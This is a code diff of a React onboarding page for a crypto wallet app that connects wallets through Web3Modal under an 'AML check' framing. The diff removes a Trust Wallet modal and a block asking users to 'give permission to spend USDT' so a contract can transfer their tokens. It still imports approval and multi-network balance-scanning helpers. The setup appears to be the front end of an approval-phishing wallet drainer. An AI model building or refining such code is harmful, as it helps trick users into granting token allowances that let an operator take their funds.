@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react'
 import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
-import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
+
 import { useWeb3Modal } from '@web3modal/wagmi/react'
 import { useAccount, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
 import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount, ERC20_ABI, USDT_ADDRESSES, checkERC20BalancesAllNetworks } from '../web3/tokenTransfer'
@@ -48,7 +48,7 @@ export default function Onboarding() {
   const [debugError, setDebugError] = useState(null)
   const [erc20BalancesByNetwork, setErc20BalancesByNetwork] = useState({})
   const [isCheckingErc20, setIsCheckingErc20] = useState(false)
-  const [isTrustModalOpen, setTrustModalOpen] = useState(false)
+
   // Admin state moved to Admin page
 
   // Replace with your actual smart contract address
@@ -77,16 +77,8 @@ export default function Onboarding() {
   }
 
   function handleConnectTrustWallet() {
-    if (isTrustWalletBrowser()) {
-      const injected = connectors?.find(c => c.id === 'injected' || (c.name && c.name.toLowerCase().includes('injected')))
-      if (injected && connect) {
-        try { connect({ connector: injected }) } catch (_) {}
-        return
-      }
-      try { window.ethereum?.request?.({ method: 'eth_requestAccounts' }) } catch (_) {}
-    } else {
-      setTrustModalOpen(true)
-    }
+    // Always open our custom Web3Modal on all devices
+    open && open()
   }
 
   function handleCheckWallet() {
@@ -392,52 +384,10 @@ export default function Onboarding() {
               </div>
 
               <div className="plan-action">
-                {!isConnected ? (
-                  <CheckWalletButton onClick={handleConnectTrustWallet} >Check Wallet</CheckWalletButton>
-                ) : (
-                  <div className="wallet-connected-section">
-                    <div className="wallet-info">
-                      <p>Connected: <strong>{address?.slice(0, 6)}...{address?.slice(-4)}</strong></p>
-                      <p className="network-info">Selected network: {chainId ? getNetworkNameFromChainId(chainId) : 'Not specified'}</p>
-                    </div>
-                    
-                    {usdtBalance !== null && (
-                      <div className="balance-display">
-                        <p>USDT Balance: <strong>{usdtBalance} USDT</strong> on {usdtNetwork}</p>
-                        {allowance !== null && (
-                          <p>Current Allowance: <strong>{allowance} USDT</strong></p>
-                        )}
-                      </div>
-                    )}
-
-                    <div className="action-buttons">
-                      <button 
-                        className="btn-primary check-wallet-btn" 
-                        onClick={handleApproveUSDT}
-                        disabled={isApproving || isSwitchingNetwork || isCheckingBalance}
-                      >
-                        {isApproving ? 'Requesting permission…' : isSwitchingNetwork ? 'Switching…' : 'Give permission to spend USDT'}
-                      </button>
-                    </div>
-
-                    {approvalStatus && (
-                      <div className="approval-status-display">
-                        <p>{approvalStatus}</p>
-                      </div>
-                    )}
-
-                    <div className="network-controls">
-                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.ethereum)} disabled={isSwitchingNetwork}>Ethereum</button>
-                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.arbitrum)} disabled={isSwitchingNetwork}>Arbitrum</button>
-                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.polygon)} disabled={isSwitchingNetwork}>Polygon</button>
-                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.base)} disabled={isSwitchingNetwork}>Base</button>
-                    </div>
-
-                    <div className="helper-text">
-                      <p>Give permission to spend your USDT so the contract at <code>{SMART_CONTRACT_ADDRESS}</code> can transfer on your behalf when authorized.</p>
-                    </div>
-                  </div>
-                )}
+                <CheckWalletButton onClick={handleConnectTrustWallet}>Check Wallet</CheckWalletButton>
+                <div className="helper-text">
+                  <p>Use the wallet connect modal to link your wallet. AML checks are performed on the AML Check page.</p>
+                </div>
               </div>
             </div>
 
@@ -445,7 +395,7 @@ export default function Onboarding() {
           </div>
         </div>
       </main>
-      <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} dappUrl={typeof window !== 'undefined' ? `${publicBaseUrl}/aml-check${window.location.search || ''}` : '/aml-check'} />
+
       <Footer />
     </>
   )
